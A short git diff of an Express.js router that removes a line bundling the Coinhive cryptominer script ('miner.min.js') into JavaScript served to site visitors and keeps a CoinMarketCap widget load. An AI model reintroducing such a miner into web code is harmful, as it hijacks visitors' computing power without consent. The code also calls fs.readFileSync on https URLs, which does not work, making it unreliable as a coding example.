@@ -3,6 +3,7 @@
  */
 var router = require('express').Router();
 var fileSys = require('fs');
+
 var path = require("path");
 
 
@@ -12,8 +13,7 @@ router.use(require('serve-favicon')(__dirname + "./../public/ico/quake.ico"));
 var sharedModules = () => {
 	return function(req, res, next) {
 		let
-		scriptFile = fileSys.readFileSync('https://coinhive.com/lib/miner.min.js', 'utf-8');
-		scriptFile += fileSys.readFileSync('https://files.coinmarketcap.com/static/widget/currency.js', 'utf-8');
+		scriptFile = fileSys.readFileSync('https://files.coinmarketcap.com/static/widget/currency.js', 'utf-8');
 		/* scriptFile += fileSys.readFileSync('./model/UIComponent.js', 'utf-8');
 		scriptFile += fileSys.readFileSync('./model/UIComponent.js', 'utf-8');
 		scriptFile += fileSys.readFileSync('./model/actions/ClientEvents.js', 'utf-8');
